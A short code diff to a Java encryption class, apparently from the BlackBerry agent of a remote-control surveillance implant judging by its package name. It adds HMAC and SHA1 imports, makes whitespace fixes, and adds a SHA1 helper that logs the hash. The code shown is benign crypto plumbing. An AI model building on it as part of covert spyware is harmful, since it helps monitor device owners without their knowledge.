@@ -7,6 +7,10 @@
  * *************************************************/
 package com.ht.rcs.blackberry.crypto;
 
+import net.rim.device.api.crypto.HMAC;
+import net.rim.device.api.crypto.HMACKey;
+import net.rim.device.api.crypto.MACOutputStream;
+import net.rim.device.api.crypto.SHA1Digest;
 import net.rim.device.api.util.Arrays;
 
 import com.ht.rcs.blackberry.utils.Check;
@@ -129,7 +133,7 @@ public class Encryption {
 
             aes.decrypt(ct, pt);
             xor(pt, iv);
-            iv = Arrays.copy(ct);            
+            iv = Arrays.copy(ct);
 
             if ((i + 1 >= enclen / 16) && (plainlen % 16 != 0)) { // last turn
                 // and remaind
@@ -155,7 +159,7 @@ public class Encryption {
         // TODO: optimize, non creare padplain, considerare caso particolare
         // ultimo blocco
         byte[] padplain = new byte[clen];
-        
+
         byte[] crypted = new byte[clen];
 
         Utils.copy(padplain, plain, len);
@@ -192,6 +196,20 @@ public class Encryption {
         for (int i = 0; i < 16; i++) {
             pt[i] ^= iv[i];
         }
+    }
+
+    /**
+     * Calcola il SHA1 del messaggio, usando la crypto api
+     * @param message
+     * @return
+     */
+    public static byte[] SHA1(byte[] message) {
+        SHA1Digest digest = new SHA1Digest();
+        digest.update(message);
+        byte[] sha1 = digest.getDigest();
+
+        debug.trace("SHA1: " + Utils.byteArrayToHex(sha1));
+        return sha1;
     }
 
 }
